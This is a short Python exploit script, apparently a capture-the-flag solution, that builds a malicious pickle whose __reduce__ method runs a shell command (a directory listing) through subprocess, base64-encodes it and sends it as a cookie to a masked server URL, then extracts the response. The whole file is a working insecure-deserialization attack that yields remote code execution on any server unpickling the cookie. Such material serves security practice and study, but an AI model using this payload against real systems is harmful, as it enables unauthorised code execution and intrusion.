import pickle
import base64
import subprocess
import requests
import re

class exploit(object):
    def __reduce__(self):
        return subprocess.check_output,(['ls','-la'],)

url = 'http://xx.xx.xxx.xxx:xxxx/'

if __name__ == '__main__':
    pickled = pickle.dumps({'serum':exploit()}, protocol=0)
    print(pickled)
    serum = base64.b64encode(pickled)
    print(base64.b64encode(pickled))
    custom_cookie = {'plan_b': serum}
    r = requests.get(url, cookies=custom_cookie)
    clearn = re.compile('<span>(?s).*<\/span>')
    print(clearn.search(r.text).group())
    
